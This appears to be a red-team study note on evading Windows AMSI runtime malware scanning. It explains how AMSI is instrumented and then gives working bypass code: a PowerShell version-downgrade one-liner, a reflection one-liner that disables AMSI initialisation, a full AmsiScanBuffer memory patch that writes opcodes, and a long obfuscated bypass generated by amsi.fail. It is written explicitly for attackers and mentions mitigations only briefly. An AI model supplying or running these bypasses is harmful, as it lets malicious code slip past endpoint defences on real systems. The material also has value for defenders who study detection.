---
title: "Run Time Detection Evasion"
date: 2026-10-09
weight: 13
---

## 1. Introduction
- Runtime detection measures can casue many headaches and roadblocks when executing malicious code. Luckinly for us, attackers, there are several techniques and methods we can abuse and leverage to bypass common runtime detection solutions.
- when executing code or applications, it will almost always flow through a runtime, no matter the intepreter. This is most commonly seen when using windows API calls and interacting with .NET.
- CLR (Common Language Runtime) and DLR (Dynamic Language Runtime) are the runtime for .NET and are most common you will encounter when working with windows system. 
- A runtime detection measure will scan code before executioin and determine if it is malicious or not. Depending upon detection measure and technology behind it, this detection could be based on string signature, heuristics, or behaviours.
- If code is suspected of being malicious, it will be assigned a value, and if within a specified range, it will stop execution and possibly quarantine or delete the file/code.
- Runtime detection measures are different from standard anti-virus because they wiil scan directly from memroy and runtime.
- At the same time, anit-virus products can also employ these runtime detection to give more insight into the calls and hooks originating from code. In some cases, anti virus products may use a runtime detection stream/feed as part of their heuristics.
- We will primarily focus on `AMSI (Anti malware scan interface)` here. Its a runtime detection measure shipped natively with windows and is an interface for other products and solutions.

## 2. AMSI Overview
- AMSI is a powershell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime.
- Form Microsoft: "The windows anti-malware scan interface (AMSI) is versatile interface standard that allows your applications to integrate with any anit-malware product that's present on machine.
- AMSI will determine its actions from a response code as a result of monitoring and scanning. Below is list of possible response codes.
    - AMSI_RESULT_CLEAN = 0
    - AMSI_RESULT_NOT_DETECTED = 1
    - ANSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
    - AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
    - AMSI_RESULT_DETECTED - 32768

- These response codes will only be reported on the backned of AMSI or through third-party implementations.
- AMSI is fully integrated into the following windows components
    - User Account Control or UAC
    - Powershell
    - Windows Script host (wscript and cscript)
    - Javascript and VBscript
    - Office VBA macros
- As attackers, when targeting the above components, we will need to be mindful of AMSI and its implementation when executing code or abusing the components.


## 3.  AMSI Intrumentation
- The way AMSI is instrumented can be complex, including multiple DLLs and varying executions strategies depending on where it is instrumented. By Definition, AMSI is only an interface for other anti-malware products, AMSI will use multiple provider DLL and API calls depending upon on what being executed and at layer it being executed.
- AMSI is instrumented from `System.Management.Automation.dll`, a .Net assembly develped by windows.
- From the microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .Net-based applications. "
- The .Net assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory.
- The below diagram depicts how data is dissected as it flows thorugh the layers and what DLL/API calls being instrumented.
![AMSI Instrumentation](/resources_redteam/amsi_arch.png)
- In the above graph data will begin flowing dependent on interpreter used (Powershell/VBScript). VArious APIs and interfaces will be instrumented as the data flows down the model at each layer. It is important to understand the complet model of AMSI, but we can break it down core components, shown in diagram below.
![AMSI Flow](resources_redteam/amsi_flow.png)

- **Note:** AMIS is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe is already being instrumented.
- Most of our research and known bypasses are placed in the Wind32 API layer, manipulating teh `AmsiScanBuffer` API Call.
- You may also notice the 'other app' interface from AMSI. Third-parties such AV providers can instrument AMSI from their products. 
- We can break down the code for AMSI powershell instrumentation to better understand how it is implemented and checks for suspicious content. To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) maintained by cobbr. 
- InsecurePowerShell is a github fork of Powershell with security features removed; this means we can look through the compared commits and observe any security features. AMSI is only instrumented in 12 lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`
```powershell
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
 {
  HasSuspiciousContent = true;
 }

```

## 4. Powershell Downgrade Attack
- The powershell downgrade attack is a very low hanging fruit that allows attacker modify the current powershell version to remove security features.
- Most powershell sessions will start with the most recent powershell engine, but attacker can manually change the version with a one-liner. By downgrading powershell version to 2.0, you can bypass security features since they were not implemented until version 5.0
- The attack only requires a one-liner to execute in our session. We can lauch a new powershell with the flags `-Version` to specify the version.
```powershell
PowerShell -Version 2
# this atatck can activerly be seen explited in tools such as unicorn
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toStrign());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" '"'
```
- Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
- The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.



## 5. Powershell Reflection
- Reflection allows a user or administrator to access and interact with .NET assembles.
- From the microsoft docs, "Assemblies form fundamental units of deployement, version control, reuse, activation scoping, and security permissions for .NET-based applications". 
- .NET assemblies may seem foreign, however, wwe can make them more familier by knowing they take shape in familiar formats such as exe and dll.
- Powershell reflection can be abused to modify and identify information from valuable DLLs.
- AMSI utilities for powershell are stored in the `AMSIUtils` .Net assembly, located in `System.Management.Automation.AmsiUtils`.
- Matt graber published a one-liner to accomplish the goal of using reflection to modify and bypass the AMSI uitility.
```powershell
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField('amsiInitField', 'NonPublic,Static').SetValue($null, $true)
```
- To explain the code functionaltity, we will break it down into smaller sections
    - `[Ref].Assembly` - This is a reference to the current assembly, which probably as shortcut below long liner, but `[Ref].Assembly` is glabally recongnized public type in powershell, instantly hands assembly object.
    ```[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")```
    - `GetType('System.Management.Automation.AmsiUtils')` - This gets the `AMSIUtils` .Net class from the assembly.
    - `GetField('amsiInitField', 'NonPublic,Static')` - This gets the `amsiInitField` field from the `AMSIUtils` class, which is non-public and static.
    - `SetValue($null, $true)` - This sets the value of the `amsiInitField` field to `$true`, which bypasses the AMSI check.
    - Once the amsiInitFailed field is set to $true, AMSI will respond with the response code: AMSI_RESULT_NOT_DETECTED = 1


## 6. Patching AMSI
- AMSI is primarily instrumented and loaded from amsi.dll; This dll can be abused and forced to point to response code we want.
- This `AmsiScanBuffer` function provides use the hooks and functionality we need to access the pointer/buffer for response code.
- AmsiScanBuffer is vulnerable because amsi.dll is loaded into powershell process at the startup, our session has the same permission level as the utility.
- AmsiScanBuffer will scan a "Buffer" of suspected code and report it to amsi.dll to determine the response.
- We can control this function and overwrite the buffer with a clean return code. To identify the buffer needed for return code, we need to do some reverse engineering. 
- Luckily, this research and reverse engineering have already been done. We have exact return code we need to obtain a clean response.
- We will break down a code snippet modified by BC-Security and inspired by Tal-Liberman; you can find the original code [here](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py).
- RastaMouse has also has similar bypass written in C# that uses the same technique; we can find the code [here](https://github.com/rasta-mouse/AmsiScanBufferBypass).
- At a high level AMSI patching can be broken up into four steps:
    - Obtain handle of amsi.dll
    - Get process address of AmsiScanBuffer
    - Modify memomy protections of AmsiScanBuffer
    - Write opcodes to AmsiScanBuffer
- We first need to load in any external libraries or API calls we want to utilize, we will load `GetProcAddress`, `GetModuleHandle`, and `VirtualProtect` from kernel32.dll using p/invoke.
```cs
[DllImport(`"kernel32`")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

//functions are now defined, but we need load the api calls using `Add-Type`
// This cmdlet will load functions with proper type and namespace that will allow functions to be called.
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32" -NameSpace "Win32" -PassThru;

// Now that we can call our api functions, we can identify where amsi.dll,
// # and how to get to the function. First, we need to identify the process handle of AMSI
// using `GetModuleHandle`, which will then be used to identify the process address of `AmsiScanBuffer using `GetProcAddress`.
$handle = [Win32.Kernel32]::GetModuleHandle("amsi.dll");
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, "AmsiScanBuffer");

// Next, we need to modify the memory protection of AmsiScanBuffer process region
//  We can specify parameters and the buffere address for VirtualProtect
//  Information on the paramters and their values can be found from the previously mentioned API documetation
[UInt32]$Size = 0x5; // Size of the region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtect = 0; // Arbitory value to store options
[Win32.Kernel32]::VirtualProtect(
    $BufferAddress, // point to amsiscanbuffer
    $Size, //size of region
    $ProtectFlag, // new protection
    [Ref]$OldProtect // old protection
);
// we need to specify we want to overwrite the buffer with;
// the process to identify this buffer can be found here: https://rastamouse.me/memory-patching-amsi-bypass/
// Once the buffere is specified, we can use `marshal copy` to write to the process
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [UInt32]0x07, [UInt32]0x80, [UInt32]0xC3);
[system.runtime.interopservices.marshal]::copy(
    $buf, //opcode to write
    0, // where to start copying in source opcode
    $BufferAddress, // where to write (AmsiScanBuffer)
    6 // number of elements to write
);
// at this stage, we should have an amsi bypass that works
// it should be noted that with most tooling, signatures and detections can and are
// crafted to detect this script
```

## 7. Automating for Fun and profit
- While it is preffered to use the previous methods in this blog, attackers can use other automated tools to break AMSI signatures or compile a bypass.
- The first automation tool we look is at [amsi.fail](https://amsi.fail/)
- Amsi.fail will compile and generate a powershell bypass from a collection of know bypasses.
- From amsi.fail, "AMSI.fail generates obfuscated powershell snippets that break or disable AMSI for current process. The snippets are randomly selected from a small pool of techniques/variations before obuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signature."
- Below is an example of an obfuscated powershell snippet from amsi.fail
```cs
$d=$null;
$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));
$pkgzwpahfwntq="+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)";
[Threading.Thread]::Sleep(1595);
[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$(('àmsí'+'Sess'+'íón').norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[CHar]([bYtE]0x6e)+[char](125+49-49))", "NonPublic,Static").SetValue($d, $null);
[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$([chAR]([byTe]0x61)+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))", "NonPublic,Static").SetValue($null, [IntPtr]$qcgcjblv);
```
- You can attach this bypass at the beginning of your malicious code as with previous bypasses or run it in the same session before executing malicious code.

- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) allows attackers to automatically identify strings that are flagging signautures to modify and break them.
- This method of bypassing AMSI is more consistent than others because you are making the file itself clean.
- The syntax for using amsitrigger is relatively straightforward; you need to specify the file or url and what format to scan the file. Below is example of running amsitrigger.
```powershell
C:\Users\Tryhackme\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
# Signatures are highlighted in red; 
# you can break these signatures by encoding, obfuscating, etc.

```








